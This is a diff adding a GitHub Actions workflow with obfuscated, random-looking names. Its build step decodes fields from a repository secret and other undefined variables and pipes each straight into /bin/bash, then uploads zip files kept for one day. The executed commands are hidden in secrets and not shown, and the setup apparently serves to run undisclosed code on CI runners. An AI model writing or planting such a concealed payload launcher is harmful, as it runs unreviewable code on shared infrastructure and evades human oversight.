@@ -1,0 +1,23 @@
+name: rachelalex7167
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: rachelalex7167
+        env:
+          jrt43567: ${{ secrets.jrt43567 }}
+        run: |
+          printf '%s' "$jrt43567" | jq -r .vmvt761 | /bin/bash
+          echo $ljlzp641 | jq -r .ima80 | /bin/bash
+          echo $se56503 | jq -r .gm942 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: VMHXtex9
+          path: "*.zip"
+          retention-days: 1
